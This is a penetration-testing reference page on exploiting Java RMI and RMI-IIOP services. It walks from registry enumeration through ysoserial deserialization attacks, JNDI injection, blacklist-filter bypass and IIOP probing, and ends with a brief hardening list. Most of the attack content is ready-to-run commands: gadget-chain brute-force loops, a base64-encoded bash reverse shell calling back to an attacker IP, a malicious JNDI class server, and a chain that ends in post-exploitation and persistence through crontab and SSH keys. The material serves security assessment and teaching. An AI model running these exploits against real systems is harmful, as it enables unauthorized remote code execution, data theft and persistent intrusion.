---
title: "Java RMI and RMI-IIOP"
date: 2026-02-24
draft: false
---

## Overview

Java RMI (Remote Method Invocation) is Java's built-in mechanism for executing methods on objects in remote JVMs. The RMI registry, by default on port 1099, acts as a directory service for remote objects. Because RMI uses Java serialization for all object transport, exposed RMI endpoints are classic deserialization attack surfaces. When paired with outdated Commons Collections, Spring, or other library gadget chains, unauthenticated RCE is frequently achievable. RMI-IIOP extends this over the CORBA IIOP protocol.

**Default Ports:**
| Port | Service |
|------|---------|
| 1099 | RMI Registry |
| 1098 | RMI Activation System |
| Dynamic (high ports) | Exported remote objects (random ephemeral ports assigned at runtime) |
| 1050 | RMI-IIOP (optional) |
| 2809 | RMI-IIOP / CORBA standard |

> **Important — ephemeral ports:** Ports 1099/1098 are only the registry/activation ports. The actual remote objects are exported on random high ephemeral ports determined at runtime. A client must be able to reach both the registry port AND the ephemeral object port for a session to succeed. Firewalls that block 1099 but permit high ports, or vice versa, may still leave the system exploitable. Always scan the full port range during assessment — `nmap -p 1099,1098,1024-65535` on suspected RMI hosts.

---

## Recon and Fingerprinting

```bash
nmap -sV -p 1099,1098 TARGET_IP
nmap -p 1099 --script rmi-dumpregistry TARGET_IP
nmap -p 1099 --script rmi-vuln-classloader TARGET_IP
```

### Manual RMI Registry Enumeration

```bash
# Java rmidump (list registry bindings)
# Using rmiregistry client from JDK
cat > /tmp/ListRegistry.java << 'EOF'
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ListRegistry {
    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "TARGET_IP";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 1099;
        Registry reg = LocateRegistry.getRegistry(host, port);
        String[] names = reg.list();
        System.out.println("[+] RMI Registry at " + host + ":" + port);
        System.out.println("[+] Registered objects: " + names.length);
        for (String name : names) {
            System.out.println("  - " + name);
            try {
                Object obj = reg.lookup(name);
                System.out.println("    Class: " + obj.getClass().getName());
                System.out.println("    toString: " + obj.toString());
            } catch (Exception e) {
                System.out.println("    Error: " + e.getMessage());
            }
        }
    }
}
EOF
javac /tmp/ListRegistry.java -d /tmp/
java -cp /tmp ListRegistry TARGET_IP 1099
```

---

## Default RMI Registry Exposure

When an RMI registry is reachable, several attack vectors open immediately:

### 1. Object Enumeration

The RMI registry lists all registered remote objects. These can include application-specific services (e.g., `AccountService`, `DatabaseManager`) that may have methods accepting user-supplied Java objects.

### 2. Registry Binding Attack

If the RMI registry was started with `createRegistry()` and no `SecurityManager`, an attacker may be able to bind, rebind, or unbind remote objects:

```bash
# Check if you can bind to the registry
cat > /tmp/TestBind.java << 'EOF'
import java.rmi.registry.*;
import java.rmi.*;

public class TestBind {
    public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry("TARGET_IP", 1099);
        try {
            // Try to unbind a legitimate object
            reg.unbind("someService");
            System.out.println("[+] VULNERABLE: Can modify registry!");
        } catch (Exception e) {
            System.out.println("[-] Cannot modify registry: " + e.getMessage());
        }
    }
}
EOF
```

---

## Deserialization Attacks via ysoserial

### RMI Deserialization Context

When an RMI server deserializes a lookup request or method call argument, it calls `ObjectInputStream.readObject()` without sanitization. If the server's classpath contains vulnerable libraries (Commons Collections, Spring, etc.), a crafted serialized object triggers arbitrary code execution.

### Identify Vulnerable Libraries

```bash
# If you have RMI registry access, check what libraries are in use
# Many apps expose this via JMX or management endpoints
# Also check HTTP endpoints for version info

# Probe with different gadget chains — whichever executes is present
GADGETS=("CommonsCollections1" "CommonsCollections3" "CommonsCollections5" "CommonsCollections6" "CommonsCollections7" "Spring1" "Spring2" "Groovy1" "CommonsBeanutils1")
```

### ysoserial RMI Exploitation

```bash
# Download ysoserial
wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Method 1: Use ysoserial JRMP listener
# This automatically handles the RMI protocol + deserialization
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "id > /tmp/rmi_rce.txt" &

# Trigger the JRMP listener via the target (exploits the registry itself)
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit TARGET_IP 1099 CommonsCollections1 "id > /tmp/rce.txt"

# Method 2: Direct serialized object to registry lookup
java -jar ysoserial-all.jar CommonsCollections1 "id" > /tmp/cc1.ser

# Try all gadget chains
for gadget in CommonsCollections1 CommonsCollections3 CommonsCollections5 CommonsCollections6 Spring1 CommonsBeanutils1; do
  echo "[*] Trying: $gadget"
  java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit \
    TARGET_IP 1099 $gadget "id > /tmp/${gadget}_rce.txt"
  sleep 2
done
```

### Reverse Shell via RMI Deserialization

```bash
# Encode reverse shell
CMD='bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
B64=$(echo -n "$CMD" | base64 -w0)
FULL="bash -c {echo,${B64}}|{base64,-d}|bash"

# Start listener
nc -lvnp 4444 &

# Exploit
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit \
  TARGET_IP 1099 CommonsCollections1 "$FULL"
```

---

## rmiscout — RMI Interface Mapping

rmiscout enumerates RMI interfaces, discovers method signatures, and can invoke methods with custom payloads.

```bash
# Install rmiscout
git clone https://github.com/BishopFox/rmiscout.git
cd rmiscout && ./gradlew build

# List remote objects and methods
java -jar rmiscout.jar list TARGET_IP:1099

# Try wordlist-based method discovery
java -jar rmiscout.jar wordlist -l wordlist.txt -i TARGET_IP -p 1099

# Attempt deserialization via discovered methods
java -jar rmiscout.jar exploit -s "void someMethod(String arg)" \
  -p CommonsCollections6 \
  -c "id > /tmp/rce.txt" \
  -i TARGET_IP \
  -p 1099 \
  -n serviceName
```

---

## CVE-2011-3521 Context — Deserialization in Activation System

**CVSS:** 10.0 Critical
**Affected:** Multiple JDK versions
**Type:** Deserialization in RMI Activation Daemon

The RMI Activation system (port 1098, daemon `rmid`) handled activation descriptors containing serialized objects. Older JDK versions did not properly sanitize these objects, allowing unauthenticated RCE via the activation system.

```bash
# Check if RMI activation daemon is running
nmap -p 1098 TARGET_IP

# Exploit via ysoserial JRMPClient
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient TARGET_IP 1098 CommonsCollections1 "id"
```

---

## JNDI Injection via RMI

RMI can be used as a JNDI provider, enabling JNDI injection attacks similar to Log4Shell but triggered via any code path that calls `InitialContext.lookup()` with user-controlled input.

### RMI JNDI Exploit Server

```bash
# Using JNDI-Exploit-Kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
cd JNDI-Exploit-Kit
mvn package -q

# Start the exploit server
# This creates an RMI server that serves a malicious class when looked up
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -rmiPort 1099 \
  -codebase http://YOUR_IP:8888/ \
  -command "bash -c {echo,BASE64_CMD}|{base64,-d}|bash"

# Trigger JNDI lookup with RMI URL
# Target must call: new InitialContext().lookup("rmi://YOUR_IP:1099/exploit")
```

### Bypassing codebase Restrictions (JDK 8u191+)

After JDK 8u191, remote class loading via RMI codebase was disabled. Attacks pivot to:

1. **Deserialization gadget chains** — no remote class loading needed
2. **Local factory classes** — use classes already on the server classpath (e.g., `Tomcat BeanFactory`, `LDAP`)
3. **LDAP serialized Java objects** — use the `javaSerializedData` attribute

```bash
# Use marshal flow instead of remote class loading
# JNDIExploit with gadget-based approach
java -jar JNDIExploit-1.4-SNAPSHOT.jar \
  -i YOUR_IP \
  -u  # bypass mode (use local gadgets)
```

---

## RMI-IIOP Specific Attacks (Quick Reference)

RMI over IIOP (Internet Inter-ORB Protocol) is used in EJB environments (JBoss, WebLogic, WebSphere, GlassFish). Port is usually 3700 (GlassFish), 4447 (WildFly), or configured differently. See the RMI-IIOP / CORBA Deep Dive section for full attack methodology.

```bash
# Enumerate IIOP services
nmap -sV -p 3700,4447,1050,2809 TARGET_IP

# WildFly IIOP
curl -v telnet://TARGET_IP:4447

# JBoss IIOP
printf "GIOP\x01\x02\x01\x00" | nc TARGET_IP 3528

# IIOP deserialization via ysoserial
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit \
  TARGET_IP 3700 CommonsCollections1 "id > /tmp/iiop_rce.txt"
```

---

## rmidump Tool

```bash
# Using rmidump (nmap script provides similar output)
nmap -p 1099 --script rmi-dumpregistry --script-args rmi-dumpregistry.format=ascii TARGET_IP

# Custom registry dump with Java
cat > /tmp/RMIDump.java << 'EOF'
import java.rmi.*;
import java.rmi.registry.*;
import java.lang.reflect.*;

public class RMIDump {
    public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
        for (String name : reg.list()) {
            System.out.println("Binding: " + name);
            try {
                Remote obj = reg.lookup(name);
                for (Class<?> iface : obj.getClass().getInterfaces()) {
                    System.out.println("  Interface: " + iface.getName());
                    for (Method m : iface.getMethods()) {
                        StringBuilder sb = new StringBuilder("  Method: ");
                        sb.append(m.getReturnType().getSimpleName()).append(" ").append(m.getName()).append("(");
                        Class<?>[] params = m.getParameterTypes();
                        for (int i = 0; i < params.length; i++) {
                            if (i > 0) sb.append(", ");
                            sb.append(params[i].getSimpleName());
                        }
                        sb.append(")");
                        System.out.println(sb);
                    }
                }
            } catch (Exception e) {
                System.out.println("  Error: " + e.getMessage());
            }
        }
    }
}
EOF
javac /tmp/RMIDump.java -d /tmp/
java -cp /tmp RMIDump TARGET_IP 1099
```

---

## Full Attack Chain

```
1. Discovery
   nmap -p 1099,1098 --script rmi-dumpregistry TARGET_IP

2. Registry Enumeration
   └─ List bound objects
   └─ Identify interfaces and method signatures

3. Library Detection
   └─ Check HTTP/JMX for classpath info
   └─ Probe with multiple gadget chains

4. Deserialization Exploitation
   └─ rmg enum TARGET_IP 1099 (check filter type first)
   └─ ysoserial RMIRegistryExploit
   └─ Try CommonsCollections1/3/5/6, Spring1, CommonsBeanutils1
   └─ If filter is blacklist-based: try gadgets not in the blacklist
   └─ If no registry (custom port): JRMPClient direct attack
   └─ If TLS: use rmg --ssl or stunnel proxy

5. Reverse Shell
   └─ bash reverse shell via base64-encoded command

6. Post-Exploitation
   └─ Enumerate server classpath
   └─ Read application config files
   └─ Access configured databases
   └─ Pivot via internal network

7. Persistence (if needed)
   └─ Deploy crontab
   └─ Write SSH key
```

---

## JEP 290 Deserialization Filters — Bypass Context

JEP 290 (introduced in JDK 9, backported to JDK 6u141/7u131/8u121) allows applications to define serialization filters via `jdk.serialFilter`. However, filter implementations vary significantly:

- **Blacklist-based filters** enumerate known-bad classes (e.g., `!org.apache.commons.collections.functors.*`). These are common in older or hastily patched deployments and are bypassable with gadget chains not on the blacklist — for example, switching from `CommonsCollections1` to `CommonsCollections6` or `CommonsBeanutils1` if those libraries are present.
- **Allowlist-based filters** define a positive set of permitted classes and reject everything else. These are significantly harder to bypass and represent the correct implementation.

**Identification step before choosing a gadget:** Before bruteforcing gadget chains, try to determine the filter type. If `CommonsCollections1` is blocked but `CommonsCollections6` or `Spring1` executes, the filter is blacklist-based. A complete rejection of all known gadget chains suggests an allowlist filter or absent classpath gadgets. Use `rmg enum` (see below) to probe filter details where possible.

---

## RMI over TLS

Modern RMI deployments use `SslRMIClientSocketFactory` / `SslRMIServerSocketFactory` to wrap JRMP in TLS.

**Detection:**
- Standard `nmap rmi-dumpregistry` will fail with an SSL handshake error or timeout
- `ysoserial.exploit.RMIRegistryExploit` will fail similarly — it speaks plain JRMP
- Connection reset immediately after TCP handshake → likely TLS-wrapped

**Workaround:**
- Use `remote-method-guesser (rmg)` with `--ssl` flag — it handles TLS natively
- For ysoserial, wrap the connection via a local SSL-terminating proxy (e.g., `stunnel`) pointed at the RMI port
- If the cert is self-signed, configure your client to skip validation: `-Djavax.net.ssl.trustStore=...` or use rmg's built-in trust-all mode

```bash
# rmg with SSL
rmg enum TARGET_IP 1099 --ssl
rmg attack TARGET_IP 1099 --attack ysoserial --gadget CommonsCollections6 --cmd 'id' --ssl
```

---

## Registry-Less RMI Endpoints (Direct JRMP)

Not all RMI deserialization attack surfaces expose a registry on port 1099. Spring Boot RMI beans, legacy EJB components, and custom frameworks sometimes export remote objects directly on a custom port without any registry.

When `ysoserial.exploit.RMIRegistryExploit` fails (no registry), use `JRMPClient` to send a payload directly to a JRMP-speaking endpoint, bypassing the registry entirely:

```bash
# Send ysoserial payload directly to a JRMP endpoint on a custom port
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient TARGET_IP CUSTOM_PORT CommonsCollections6 'id > /tmp/rce.txt'

# Reverse shell variant
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient TARGET_IP CUSTOM_PORT CommonsCollections6 'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|bash'
```

**Identification:** If you observe a service on a non-standard port responding with Java serialization magic bytes (`\xac\xed\x00\x05`) or a JRMP handshake string, it is a direct JRMP endpoint. Use `nmap -sV` — it will often report `java-rmi` even on non-1099 ports.

---

## remote-method-guesser (rmg)

`rmg` is a modern replacement for rmiscout with faster enumeration, built-in SSL support, and better exploit automation against both registry and non-registry RMI endpoints.

```bash
# Install
git clone https://github.com/qtc-de/remote-method-guesser
cd remote-method-guesser && mvn package -q

# Full enumeration — lists bound names, interfaces, deserialization filter info, security manager
rmg enum TARGET_IP 1099

# Guess method signatures using a wordlist (rmiscout-style)
rmg guess TARGET_IP 1099

# Deserialization attack via ysoserial
rmg attack TARGET_IP 1099 --attack ysoserial --gadget CommonsCollections6 --cmd 'id'

# Bind/rebind/unbind attack (if registry is writable)
rmg bind TARGET_IP 1099 --bound-name evil --gadget CommonsCollections6 --cmd 'id'

# With SSL
rmg enum TARGET_IP 1099 --ssl
```

`rmg enum` reports filter type (blacklist vs allowlist) and filter rules when the server exposes them, which is critical for gadget selection.

---

## RMI-IIOP / CORBA Deep Dive

### Protocol Distinction

RMI-IIOP uses the GIOP (General Inter-ORB Protocol) wire format rather than JRMP. This means:

- Standard ysoserial JRMP exploits do NOT work directly against IIOP endpoints
- Tools must speak GIOP to interact with these services
- IIOP is standard on port 2809 (CORBA) but is commonly multiplexed on port 7001 in WebLogic (alongside T3), and port 3528/4447 in JBoss/WildFly

### Fingerprinting IIOP

```bash
# nmap GIOP info script
nmap -p 2809,7001,3528,4447 --script giop-info TARGET_IP

# Raw GIOP probe — check for "GIOP" magic bytes in response
printf "GIOP\x01\x02\x01\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01" | nc TARGET_IP 2809 | xxd | head
```

### Attack Approach

- IIOP carries serialized Java objects inside GIOP `Any` type fields in `MarshalledObject` wrappers
- To attack: intercept GIOP traffic (Wireshark, mitmproxy) and identify `Any` type fields or `MarshalledObject` instances that are deserialized on the server
- Inject a ysoserial payload as the serialized content inside a `MarshalledObject`
- The attack is more complex than JRMP because a Stub class matching the remote interface is required to form a valid GIOP request
- **WebLogic-specific:** IIOP is typically accessible on port 7001 alongside T3. Admins who disable T3 often neglect IIOP. CVE-2023-21839 exploits JNDI injection via both T3 and IIOP on WebLogic.

### Tools

- `IOP-Scanner`: enumerates CORBA/IIOP services
- `JacORB`: Java ORB library for building custom IIOP clients
- `ysoserial` with WebLogic T3/IIOP modules for targeted WebLogic IIOP attacks

---

## Detection and Mitigation

```bash
# Detect RMI with iptables logging
iptables -A INPUT -p tcp --dport 1099 -j LOG --log-prefix "RMI_ACCESS: "

# JVM argument to restrict deserialization (Java 9+)
# -Djdk.serialFilter=maxbytes=10485760;maxdepth=100;maxrefs=1000;maxarray=100000
```

### Hardening

- Do not expose RMI registry to untrusted networks — firewall port 1099
- Use Java serialization filters (JEP 290, available from JDK 9+)
- Use the `jdk.serialFilter` system property to allowlist deserializable classes
- Upgrade libraries — CommonsCollections, Spring, Groovy
- Disable RMI activation daemon (`rmid`) if not needed
- Use RMI over SSL (`rmissl`)
- Regularly audit what objects are registered in RMI registries
- Consider replacing RMI with gRPC or REST for new applications


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.